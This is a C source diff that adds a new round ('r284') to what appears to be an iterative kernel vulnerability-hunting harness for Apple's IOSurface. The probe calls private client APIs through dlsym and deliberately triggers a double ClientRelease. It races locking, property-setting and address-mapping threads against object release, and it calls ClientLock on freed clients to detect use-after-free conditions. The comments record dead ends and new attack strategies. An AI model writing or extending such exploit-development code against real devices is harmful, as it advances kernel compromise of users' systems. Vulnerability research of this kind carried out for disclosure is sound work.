@@ -1745,6 +1745,275 @@ static volatile int r265_probed = 0;
 
 typedef void* IOSurfaceClientRef;
 
+/* r284: Race ClientRelease vs IOSurface kernel operations.
+ * r283 DEAD END: notification entries store surface IDs, not kernel pointers.
+ * NEW STRATEGY: Race between ClientRelease (which frees the kernel object)
+ * and concurrent IOSurface operations that hold a direct kernel pointer:
+ * - Lock/Unlock (kernel dereferences IOSurface at +0xD8)
+ * - GetBaseAddress (maps kernel pages)
+ * - SetValue/CopyValue (accesses property store in kernel object)
+ * Also test: double ClientLookup → double ClientRelease (double-free).
+ * And: Metal texture creation from surface, then ClientRelease.
+ */
+#include <pthread.h>
+
+struct r284_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int release_done;
+    uint32_t surf_id;
+    IOSurfaceRef surf;
+    int lock_count;
+    int lock_after_free;
+    int crash_count;
+};
+
+static void *r284_lock_thread(void *arg) {
+    struct r284_ctx *ctx = (struct r284_ctx *)arg;
+    while (!ctx->go) ;
+    while (!ctx->stop) {
+        kern_return_t kr = IOSurfaceLock(ctx->surf, 0, NULL);
+        if (kr == 0) {
+            ctx->lock_count++;
+            if (ctx->release_done) ctx->lock_after_free++;
+            IOSurfaceUnlock(ctx->surf, 0, NULL);
+        }
+    }
+    return NULL;
+}
+
+static void *r284_getaddr_thread(void *arg) {
+    struct r284_ctx *ctx = (struct r284_ctx *)arg;
+    while (!ctx->go) ;
+    while (!ctx->stop) {
+        void *base = IOSurfaceGetBaseAddress(ctx->surf);
+        (void)base;
+        if (ctx->release_done && base != NULL) ctx->lock_after_free++;
+    }
+    return NULL;
+}
+
+static void *r284_setval_thread(void *arg) {
+    struct r284_ctx *ctx = (struct r284_ctx *)arg;
+    int val = 42;
+    CFNumberRef num = CFNumberCreate(NULL, kCFNumberIntType, &val);
+    while (!ctx->go) ;
+    while (!ctx->stop) {
+        IOSurfaceSetValue(ctx->surf, CFSTR("r284_test"), num);
+        if (ctx->release_done) ctx->lock_after_free++;
+    }
+    CFRelease(num);
+    return NULL;
+}
+
+static void r284_probe(void) {
+    rlog("\n=== r284: Race ClientRelease vs IOSurface Operations ===\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    if (!clLookup || !clRelease) {
+        rlog("  FATAL: client APIs not found\n");
+        return;
+    }
+
+    /* Part 1: Double ClientLookup → double ClientRelease */
+    rlog("\n--- Part 1: Double ClientLookup/Release (5 trials) ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 5; trial++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+
+        IOSurfaceClientRef cl1 = clLookup(sid);
+        IOSurfaceClientRef cl2 = clLookup(sid);
+        rlog("  trial %d: id=%u cl1=%p cl2=%p same=%d\n", trial, sid,
+            cl1, cl2, cl1 == cl2);
+
+        CFRelease(s);
+        rlog("    CFRelease done, lookup=%p\n", (void*)IOSurfaceLookup(sid));
+
+        clRelease(cl1);
+        IOSurfaceRef after1 = IOSurfaceLookup(sid);
+        rlog("    after 1st ClientRelease: lookup=%p\n", (void*)after1);
+        if (after1) CFRelease(after1);
+
+        if (cl1 != cl2) {
+            clRelease(cl2);
+            IOSurfaceRef after2 = IOSurfaceLookup(sid);
+            rlog("    after 2nd ClientRelease: lookup=%p\n", (void*)after2);
+            if (after2) CFRelease(after2);
+        } else {
+            rlog("    SAME client — 2nd release would be double-free, skipping\n");
+            uint32_t seed = 0;
+            kern_return_t lk = clLock ? clLock(cl2, 0, &seed) : -1;
+            rlog("    ClientLock on released client: 0x%x seed=%u\n", lk, seed);
+        }
+        fflush(stdout);
+    }
+
+    /* Part 2: Race ClientRelease vs Lock (10 iterations, 4 threads each) */
+    rlog("\n--- Part 2: Race ClientRelease vs Lock (10 iterations) ---\n");
+    fflush(stdout);
+    for (int iter = 0; iter < 10; iter++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=256,h=256,bpe=4,bpr=256*4,pf=0x42475241,as=256*256*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        struct r284_ctx ctx = {0};
+        ctx.surf = IOSurfaceCreate(p);
+        CFRelease(p);
+        ctx.surf_id = IOSurfaceGetID(ctx.surf);
+
+        IOSurfaceClientRef cl = clLookup(ctx.surf_id);
+
+        pthread_t t1, t2;
+        pthread_create(&t1, NULL, r284_lock_thread, &ctx);
+        pthread_create(&t2, NULL, r284_setval_thread, &ctx);
+
+        usleep(1000);
+        ctx.go = 1;
+        usleep(500);
+
+        CFRelease(ctx.surf);
+        clRelease(cl);
+        ctx.release_done = 1;
+
+        usleep(2000);
+        ctx.stop = 1;
+        pthread_join(t1, NULL);
+        pthread_join(t2, NULL);
+
+        rlog("  iter %d: id=%u locks=%d after_free=%d\n",
+            iter, ctx.surf_id, ctx.lock_count, ctx.lock_after_free);
+        fflush(stdout);
+    }
+
+    /* Part 3: Tight race — many surfaces, rapid create/release */
+    rlog("\n--- Part 3: Rapid create-release churn (200 iterations) ---\n");
+    fflush(stdout);
+    int survived = 0;
+    for (int i = 0; i < 200; i++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+        IOSurfaceClientRef cl = clLookup(sid);
+        IOSurfaceRef s2 = IOSurfaceLookup(sid);
+
+        CFRelease(s);
+        clRelease(cl);
+
+        if (s2) {
+            kern_return_t lk = IOSurfaceLock(s2, 0, NULL);
+            if (lk == 0) {
+                void *base = IOSurfaceGetBaseAddress(s2);
+                IOSurfaceUnlock(s2, 0, NULL);
+                if (base) survived++;
+            }
+            CFRelease(s2);
+        }
+    }
+    rlog("  200 iterations: %d had valid base addr after ClientRelease\n", survived);
+
+    /* Part 4: ClientLock after ClientRelease (use-after-free on client obj) */
+    rlog("\n--- Part 4: ClientLock after ClientRelease ---\n");
+    fflush(stdout);
+    for (int trial = 0; trial < 5; trial++) {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        uint32_t sid = IOSurfaceGetID(s);
+        IOSurfaceClientRef cl = clLookup(sid);
+
+        uint32_t seed1 = 0;
+        kern_return_t lk1 = clLock ? clLock(cl, 0, &seed1) : -1;
+        rlog("  trial %d: id=%u lock_before=0x%x seed=%u\n", trial, sid, lk1, seed1);
+
+        CFRelease(s);
+        clRelease(cl);
+        rlog("    released both\n");
+
+        uint32_t seed2 = 0;
+        kern_return_t lk2 = clLock ? clLock(cl, 0, &seed2) : -1;
+        rlog("    lock_after_release=0x%x seed=%u", lk2, seed2);
+        if (lk2 == 0) rlog(" *** UAF: lock succeeded on freed client! ***");
+        rlog("\n");
+        fflush(stdout);
+    }
+
+    rlog("\n*** r284 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r283: Trigger dangling notification via ClientRelease.
  * r282 KEY FINDING: IOSurfaceClientRelease is the REAL destructor.
  * CFRelease alone does NOT free the kernel object (client holds last ref).
@@ -26228,6 +26497,15 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 284) {
+            rlog("*** rounds=284: Race ClientRelease vs IOSurface Operations ***\n");
+            rlog("  r283 DEAD END: notifications store IDs, not kernel pointers.\n");
+            rlog("  Testing: double ClientRelease, race Lock vs Release,\n");
+            rlog("           rapid churn, ClientLock after ClientRelease.\n\n");
+            fflush(stdout);
+            r284_probe();
             goto done;
         }
         if (rounds == 283) {
